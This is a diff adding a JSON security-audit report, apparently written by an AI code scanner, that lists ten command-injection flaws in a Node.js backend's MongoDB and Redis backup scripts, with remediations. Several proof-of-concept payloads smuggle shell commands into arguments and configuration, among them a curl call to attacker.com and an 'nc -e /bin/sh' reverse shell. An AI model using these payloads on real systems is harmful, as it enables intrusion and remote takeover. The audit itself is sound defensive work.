@@ -1,0 +1,296 @@
+{
+  "scan_metadata": {
+    "repository": "https://github.com/mischa23v/traf3li-backend",
+    "scan_date": "2025-12-22",
+    "scanner": "Claude Code Security Scanner",
+    "vulnerability_type": "Command Injection (CWE-78)",
+    "total_files_scanned": 4,
+    "total_vulnerabilities": 10
+  },
+  "summary": {
+    "critical": 4,
+    "high": 5,
+    "medium": 1,
+    "low": 0,
+    "overall_severity": "CRITICAL"
+  },
+  "vulnerabilities": [
+    {
+      "id": "CMD-INJ-001",
+      "severity": "CRITICAL",
+      "file": "/home/user/traf3li-backend/src/scripts/restore.js",
+      "line": 254,
+      "function": "restoreDatabase",
+      "vulnerability": "Command Injection via oplogLimit parameter",
+      "description": "User-controlled command-line argument --oplog-limit is directly interpolated into shell command without sanitization",
+      "vulnerable_code": "restoreCommand += ` --oplogReplay --oplogLimit=\"${oplogLimit}\"`",
+      "user_input": true,
+      "attack_vector": "Command-line arguments",
+      "exploitability": "EASY",
+      "impact": "Remote Code Execution",
+      "proof_of_concept": "node src/scripts/restore.js --backup=test.gz --oplog-limit='1\"; curl attacker.com/pwned; #'",
+      "remediation": "Use execFile() with array arguments and validate oplogLimit format with regex /^[0-9]+:[0-9]+$/",
+      "cwe": "CWE-78",
+      "owasp": "A03:2021 - Injection"
+    },
+    {
+      "id": "CMD-INJ-002",
+      "severity": "CRITICAL",
+      "file": "/home/user/traf3li-backend/src/scripts/restore.js",
+      "line": 250,
+      "function": "restoreDatabase",
+      "vulnerability": "Command Injection via mongoUri and localPath",
+      "description": "Configuration-based mongoUri and downloaded file path interpolated into shell command",
+      "vulnerable_code": "let restoreCommand = `mongorestore --uri=\"${mongoUri}\" --archive=\"${localPath}\" --gzip --drop`",
+      "user_input": false,
+      "attack_vector": "Configuration file poisoning, S3 object key manipulation",
+      "exploitability": "MEDIUM",
+      "impact": "Remote Code Execution",
+      "proof_of_concept": "MONGODB_URI='mongodb://localhost\"; whoami; #'",
+      "remediation": "Use execFile() with array arguments",
+      "cwe": "CWE-78",
+      "owasp": "A03:2021 - Injection"
+    },
+    {
+      "id": "CMD-INJ-003",
+      "severity": "HIGH",
+      "file": "/home/user/traf3li-backend/src/scripts/restore.js",
+      "line": 213,
+      "function": "createSafetyBackup",
+      "vulnerability": "Command Injection via mongoUri and safetyPath",
+      "description": "Configuration mongoUri and generated path interpolated into shell command",
+      "vulnerable_code": "const dumpCommand = `mongodump --uri=\"${mongoUri}\" --archive=\"${safetyPath}\" --gzip`",
+      "user_input": false,
+      "attack_vector": "Configuration file poisoning",
+      "exploitability": "MEDIUM",
+      "impact": "Remote Code Execution",
+      "remediation": "Use execFile() with array arguments",
+      "cwe": "CWE-78",
+      "owasp": "A03:2021 - Injection"
+    },
+    {
+      "id": "CMD-INJ-004",
+      "severity": "HIGH",
+      "file": "/home/user/traf3li-backend/src/scripts/restore.js",
+      "line": 175,
+      "function": "validateBackup",
+      "vulnerability": "Command Injection via localPath",
+      "description": "Downloaded file path from S3 interpolated into gzip test command",
+      "vulnerable_code": "const { stdout, stderr } = await execAsync(`gzip -t \"${localPath}\"`)",
+      "user_input": false,
+      "attack_vector": "S3 object key manipulation",
+      "exploitability": "MEDIUM",
+      "impact": "Remote Code Execution",
+      "remediation": "Use execFile() with array arguments",
+      "cwe": "CWE-78",
+      "owasp": "A03:2021 - Injection"
+    },
+    {
+      "id": "CMD-INJ-005",
+      "severity": "HIGH",
+      "file": "/home/user/traf3li-backend/src/scripts/backup.js",
+      "line": 109,
+      "function": "createBackup",
+      "vulnerability": "Command Injection via mongoUri and backupPath",
+      "description": "Configuration mongoUri and generated backup path interpolated into shell command",
+      "vulnerable_code": "let dumpCommand = `mongodump --uri=\"${mongoUri}\" --archive=\"${backupPath}\" --gzip`",
+      "user_input": false,
+      "attack_vector": "Configuration file poisoning",
+      "exploitability": "MEDIUM",
+      "impact": "Remote Code Execution",
+      "remediation": "Use execFile() with array arguments",
+      "cwe": "CWE-78",
+      "owasp": "A03:2021 - Injection"
+    },
+    {
+      "id": "CMD-INJ-006",
+      "severity": "CRITICAL",
+      "file": "/home/user/traf3li-backend/src/scripts/backup.js",
+      "line": 114,
+      "function": "createBackup",
+      "vulnerability": "Command Injection via excludeCollections configuration",
+      "description": "Collection names from configuration mapped to command arguments without validation",
+      "vulnerable_code": "const excludeArgs = this.config.mongodb.dumpOptions.excludeCollections.map(col => `--excludeCollection=\"${col}\"`).join(' ')",
+      "user_input": false,
+      "attack_vector": "Configuration file poisoning",
+      "exploitability": "MEDIUM",
+      "impact": "Remote Code Execution",
+      "proof_of_concept": "excludeCollections: ['test\"; nc -e /bin/sh attacker.com 4444; #']",
+      "remediation": "Validate collection names with regex /^[a-zA-Z0-9_.-]+$/ and use execFile()",
+      "cwe": "CWE-78",
+      "owasp": "A03:2021 - Injection"
+    },
+    {
+      "id": "CMD-INJ-007",
+      "severity": "HIGH",
+      "file": "/home/user/traf3li-backend/src/scripts/backup.js",
+      "line": 128,
+      "function": "createBackup",
+      "vulnerability": "Command Execution of vulnerable dumpCommand",
+      "description": "Executes the command built with vulnerable string interpolation",
+      "vulnerable_code": "const { stdout, stderr } = await execAsync(dumpCommand)",
+      "user_input": false,
+      "attack_vector": "Related to CMD-INJ-005 and CMD-INJ-006",
+      "exploitability": "MEDIUM",
+      "impact": "Remote Code Execution",
+      "remediation": "Use execFile() instead of exec()",
+      "cwe": "CWE-78",
+      "owasp": "A03:2021 - Injection"
+    },
+    {
+      "id": "CMD-INJ-008",
+      "severity": "HIGH",
+      "file": "/home/user/traf3li-backend/src/scripts/backupRedis.js",
+      "line": 202,
+      "function": "copyAndCompressRDB",
+      "vulnerability": "Command Injection via rdbPath and backupPath",
+      "description": "Redis configuration paths interpolated into gzip command",
+      "vulnerable_code": "const compressCommand = `gzip -c \"${rdbPath}\" > \"${backupPath}\"`",
+      "user_input": false,
+      "attack_vector": "Redis configuration poisoning or config file manipulation",
+      "exploitability": "MEDIUM",
+      "impact": "Remote Code Execution",
+      "remediation": "Use Node.js streams (createReadStream + createGzip + createWriteStream) instead of shell command",
+      "cwe": "CWE-78",
+      "owasp": "A03:2021 - Injection"
+    },
+    {
+      "id": "CMD-INJ-009",
+      "severity": "HIGH",
+      "file": "/home/user/traf3li-backend/src/scripts/backupRedis.js",
+      "line": 183,
+      "function": "copyAndCompressRDB",
+      "vulnerability": "Unsafe path construction from configuration",
+      "description": "Path constructed from config.redis.dataDir and config.redis.rdbFilename without validation",
+      "vulnerable_code": "rdbPath = path.join(this.config.redis.dataDir, this.config.redis.rdbFilename)",
+      "user_input": false,
+      "attack_vector": "Configuration file poisoning",
+      "exploitability": "MEDIUM",
+      "impact": "Path Traversal leading to arbitrary file read/compression",
+      "remediation": "Validate paths and filenames, ensure they don't contain shell metacharacters",
+      "cwe": "CWE-78",
+      "owasp": "A03:2021 - Injection"
+    },
+    {
+      "id": "CMD-INJ-010",
+      "severity": "MEDIUM",
+      "file": "/home/user/traf3li-backend/src/scripts/backupScheduler.js",
+      "line": 47,
+      "function": "executeBackup",
+      "vulnerability": "Potential Command Injection via type parameter",
+      "description": "Type parameter used in command construction, currently only called with safe values",
+      "vulnerable_code": "const command = `node ${scriptPath} ${typeArg}`",
+      "user_input": false,
+      "attack_vector": "Currently internal only, but vulnerable if executeBackup() receives external input",
+      "exploitability": "LOW",
+      "impact": "Remote Code Execution if modified to accept user input",
+      "remediation": "Use execFile() or validate type parameter against whitelist ['daily', 'weekly', 'monthly', 'redis']",
+      "cwe": "CWE-78",
+      "owasp": "A03:2021 - Injection"
+    }
+  ],
+  "missing_controls": [
+    {
+      "control": "Input Sanitization",
+      "status": "MISSING",
+      "description": "No sanitization of shell metacharacters in user inputs or configuration values"
+    },
+    {
+      "control": "Shell Escaping Library",
+      "status": "MISSING",
+      "description": "No shell-escape or shell-quote library installed in package.json"
+    },
+    {
+      "control": "Safe Process Execution",
+      "status": "MISSING",
+      "description": "Using child_process.exec() instead of safer alternatives like execFile() or spawn()"
+    },
+    {
+      "control": "Input Validation",
+      "status": "MISSING",
+      "description": "No validation of command-line arguments, paths, or configuration values"
+    },
+    {
+      "control": "Allowlist/Whitelist",
+      "status": "MISSING",
+      "description": "No whitelisting of allowed characters or values for inputs"
+    }
+  ],
+  "api_exposure": {
+    "exposed_via_api": false,
+    "exposure_method": "CLI scripts only",
+    "notes": "Scripts are not exposed via HTTP API endpoints, only accessible via npm scripts and direct CLI execution"
+  },
+  "remediation_priority": [
+    {
+      "priority": 1,
+      "action": "Fix CMD-INJ-001 (restore.js oplogLimit)",
+      "timeline": "Immediate",
+      "effort": "Low"
+    },
+    {
+      "priority": 2,
+      "action": "Replace all exec() with execFile()",
+      "timeline": "This week",
+      "effort": "Medium"
+    },
+    {
+      "priority": 3,
+      "action": "Add input validation for all parameters",
+      "timeline": "This week",
+      "effort": "Medium"
+    },
+    {
+      "priority": 4,
+      "action": "Install and use shell-escape library",
+      "timeline": "This week",
+      "effort": "Low"
+    },
+    {
+      "priority": 5,
+      "action": "Add audit logging and monitoring",
+      "timeline": "Next sprint",
+      "effort": "Medium"
+    }
+  ],
+  "affected_commands": [
+    {
+      "command": "gzip",
+      "files": ["restore.js", "backupRedis.js"],
+      "safe_alternative": "Node.js zlib module or execFile(['gzip', '-t', path])"
+    },
+    {
+      "command": "mongodump",
+      "files": ["restore.js", "backup.js"],
+      "safe_alternative": "execFile('mongodump', [args])"
+    },
+    {
+      "command": "mongorestore",
+      "files": ["restore.js"],
+      "safe_alternative": "execFile('mongorestore', [args])"
+    },
+    {
+      "command": "node",
+      "files": ["backupScheduler.js"],
+      "safe_alternative": "execFile('node', [args])"
+    }
+  ],
+  "recommendations": {
+    "immediate": [
+      "Replace child_process.exec() with child_process.execFile() in all 4 files",
+      "Add input validation for oplogLimit parameter in restore.js",
+      "Add validation for collection names in backup.js"
+    ],
+    "short_term": [
+      "Install shell-escape library: npm install shell-escape",
+      "Add path validation for all file operations",
+      "Implement whitelist validation for configuration values"
+    ],
+    "long_term": [
+      "Add comprehensive unit tests for injection prevention",
+      "Implement audit logging for all script executions",
+      "Add monitoring for suspicious patterns in inputs",
+      "Consider using native Node.js modules instead of shell commands where possible"
+    ]
+  }
+}
